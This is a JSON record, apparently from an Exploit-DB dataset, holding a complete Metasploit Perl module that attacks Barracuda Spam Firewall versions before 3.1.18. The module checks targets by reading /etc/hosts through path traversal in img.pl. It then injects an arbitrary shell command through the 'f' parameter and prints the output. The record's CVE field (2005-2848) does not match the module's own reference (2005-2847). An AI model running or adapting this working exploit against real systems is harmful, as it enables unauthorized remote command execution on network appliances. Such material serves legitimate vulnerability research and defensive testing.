{
  "id": "1236",
  "title": "Barracuda Spam Firewall &lt; 3.1.18 - Command Execution (Metasploit)",
  "cve": "CVE-2005-2848",
  "vuln_type": "rce",
  "code": "##\r\n# This file is part of the Metasploit Framework and may be redistributed\r\n# according to the licenses defined in the Authors field below. In the\r\n# case of an unknown or missing license, this file defaults to the same\r\n# license as the core Framework (dual GPLv2 and Artistic). The latest\r\n# version of the Framework can always be obtained from metasploit.com.\r\n##\r\n\r\npackage Msf::Exploit::barracuda_img_exec;\r\nuse base \"Msf::Exploit\";\r\nuse strict;\r\nuse Pex::Text;\r\nuse bytes;\r\n\r\nmy $advanced = { };\r\n\r\nmy $info = {\r\n\t'Name'     => 'Barracuda IMG.PL Remote Command Execution',\r\n\t'Version'  => '$Revision: 1.0 $',\r\n\t'Authors'  => [ 'Nicolas Gregoire <ngregoire@exaprobe.com>' ],\r\n\t'Arch'     => [ 'x86' ],\r\n\t'OS'       => [ 'linux' ],\r\n\t'Priv'     => 0,\r\n\t'UserOpts' =>\r\n\t  {\r\n\t\t'RHOST' => [1, 'ADDR', 'The target address'],\r\n\t\t'RPORT' => [1, 'PORT', 'The target port', 8000],\r\n\t\t'VHOST' => [0, 'DATA', 'The virtual host name of the server'],\r\n\t\t'IMG'   => [1, 'DATA', 'Full path of img.pl script', '/cgi-bin/img.pl'],\r\n\t\t'SSL'   => [0, 'BOOL', 'Use SSL'],\r\n\t  },\r\n\r\n\t'Description' => Pex::Text::Freeform(qq{\r\n\t\tThis module exploits an arbitrary command execution vulnerability in the\r\n\t\tBarracuda Spam Firewall appliance. Versions prior to  3.1.18 are vulnerable.\r\n}),\r\n\r\n\t'Refs' =>\r\n\t  [\r\n\t\t['URL', 'http://www.securiweb.net/wiki/Ressources/AvisDeSecurite/2005.1'],\r\n\t\t['CVE', '2005-2847'],\r\n\t\t['OSVDB', '19279'],\r\n\t\t['BID', '14712'],\r\n\t\t['NSS', '19556'],\r\n\t  ],\r\n\r\n\t'Payload' =>\r\n\t  {\r\n\t\t'Space' => 512,\r\n\t\t'Keys'  => ['cmd'],\r\n\t  },\r\n\r\n\t'Keys' => ['barracuda'],\r\n  };\r\n\r\nsub new {\r\n\tmy $class = shift;\r\n\tmy $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);\r\n\treturn($self);\r\n}\r\n\r\nsub Check {\r\n\tmy $self = shift;\r\n\tmy $target_host    = $self->GetVar('RHOST');\r\n\tmy $vhost          = $self->VHost;\r\n\tmy $target_port    = $self->GetVar('RPORT');\r\n\tmy $img            = $self->GetVar('IMG');\r\n\r\n\tmy $request =\r\n\t  \"GET $img?f=%2e%2e/etc/hosts HTTP/1.1\\r\\n\".\r\n\t  \"Accept: */*\\r\\n\".\r\n\t  \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\".\r\n\t  \"Host: $vhost:$target_port\\r\\n\".\r\n\t  \"Connection: Close\\r\\n\".\r\n\t  \"\\r\\n\";\r\n\r\n\tmy $s = Msf::Socket::Tcp->new(\r\n\t\t'PeerAddr' => $target_host,\r\n\t\t'PeerPort' => $target_port,\r\n\t\t'SSL'      => $self->GetVar('SSL'),\r\n\t  );\r\n\r\n\tif ($s->IsError){\r\n\t\t$self->PrintLine('[*] Error creating socket: ' . $s->GetError);\r\n\t\treturn $self->CheckCode('Connect');\r\n\t}\r\n\r\n\t$self->PrintLine(\"[*] Establishing a connection to the target...\");\r\n\r\n\t$s->Send($request);\r\n\tmy $results = $s->Recv(-1, 20);\r\n\t$s->Close();\r\n\t\r\n\tif (($results =~ /HTTP\\/1\\..\\s+200/) && ($results =~/127\\.0\\.0\\.1/)) {\r\n\r\n\t\t$self->PrintLine(\"[*] Vulnerable server detected!\");\r\n\t\treturn $self->CheckCode('Confirmed');\r\n\t\t\r\n\t} elsif ($results =~ /HTTP\\/1\\..\\s+([345]\\d+)/) {\r\n\r\n\t\t$self->PrintLine(\"[*] The Barraccuda application was not found.\");\r\n\t\treturn $self->CheckCode('Safe');\r\n\t}\r\n\r\n\t$self->PrintLine(\"[*] Generic error...\");\r\n\treturn $self->CheckCode('Generic');\r\n}\r\n\r\nsub Exploit {\r\n\tmy $self = shift;\r\n\tmy $target_host    = $self->GetVar('RHOST');\r\n\tmy $vhost          = $self->VHost;\r\n\tmy $target_port    = $self->GetVar('RPORT');\r\n\tmy $img            = $self->GetVar('IMG');\r\n\tmy $encodedPayload = $self->GetVar('EncodedPayload');\r\n\tmy $cmd            = $encodedPayload->RawPayload;\r\n\r\n\t$img = $img.\"?f=\".$self->URLEncode(qq#../bin/sh -c \"echo 'YYY';#. $cmd .qq#;echo 'YYY'\"|#);\r\n\r\n\tmy $request =\r\n\t  \"GET $img HTTP/1.1\\r\\n\".\r\n\t  \"Accept: */*\\r\\n\".\r\n\t  \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\".\r\n\t  \"Host: $vhost:$target_port\\r\\n\".\r\n\t  \"Connection: Close\\r\\n\".\r\n\t  \"\\r\\n\";\r\n\r\n\tmy $s = Msf::Socket::Tcp->new(\r\n\t\t'PeerAddr' => $target_host,\r\n\t\t'PeerPort' => $target_port,\r\n\t\t'SSL'      => $self->GetVar('SSL'),\r\n\t  );\r\n\r\n\tif ($s->IsError){\r\n\t\t$self->PrintLine('[*] Error creating socket: ' . $s->GetError);\r\n\t\treturn;\r\n\t}\r\n\r\n\t$self->PrintLine(\"[*] Establishing a connection to the target...\");\r\n\t$s->Send($request);\r\n\tmy $results = $s->Recv(-1, 20);\r\n\t\r\n\tif ($results =~ /HTTP\\/1\\.. 200 OK/im) {\r\n\r\n\t\t(undef, $results) = split(/YYY/, $results);\r\n\t\t\r\n\t\t$self->PrintLine(' ');\r\n\t\t$self->PrintLine(\"$results\");\r\n\t\t$self->PrintLine(' ');\r\n\r\n\t\t$self->PrintLine(\"[*] End of data.\");\r\n\r\n\t} else {\r\n\t\t$self->PrintLine(' ');\r\n\t\t$self->PrintLine(\"Doh ! Are you sure this server is vulnerable ?\");\r\n\t}\r\n\r\n\t$s->Close();\r\n\treturn;\r\n}\r\n\r\nsub URLEncode {\r\n\tmy $self = shift;\r\n\tmy $data = shift;\r\n\tmy $res;\r\n\r\n\tforeach my $c (unpack('C*', $data)) {\r\n\t\tif (\r\n\t\t\t($c >= 0x30 && $c <= 0x39) ||\r\n\t\t\t($c >= 0x41 && $c <= 0x5A) ||\r\n\t\t\t($c >= 0x61 && $c <= 0x7A)\r\n\t\t  ) {\r\n\t\t\t$res .= chr($c);\r\n\t\t} else {\r\n\t\t\t$res .= sprintf(\"%%%.2x\", $c);\r\n\t\t}\r\n\t}\r\n\treturn $res;\r\n}\r\n\r\nsub VHost {\r\n\tmy $self = shift;\r\n\tmy $name = $self->GetVar('VHOST') || $self->GetVar('RHOST');\r\n\treturn $name;\r\n}\r\n\r\n1;\r\n\r\n# milw0rm.com [2005-09-27]",
  "url": "https://www.exploit-db.com/exploits/1236"
}